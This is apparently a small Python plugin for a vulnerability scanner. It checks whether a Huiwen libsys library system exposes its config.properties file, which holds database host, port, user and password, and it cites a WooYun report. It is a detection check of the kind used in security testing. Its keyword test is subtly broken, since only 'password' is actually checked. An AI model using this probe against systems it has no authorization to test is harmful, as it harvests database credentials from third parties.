#!/usr/bin/python
#-*- encoding:utf-8 -*-
# title:汇文libsys图书管理系统敏感信息泄露
#http://www.wooyun.org/bugs/wooyun-2010-0125785

def assign(service, arg):
    if service == "libsys":
        return True, arg


def audit(arg):
    payload = 'include/config.properties'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and 'host' and 'port' and 'user' and 'password' in res:
        security_warning(url)


        return arg
if __name__== '__main__':
    from dummy import *
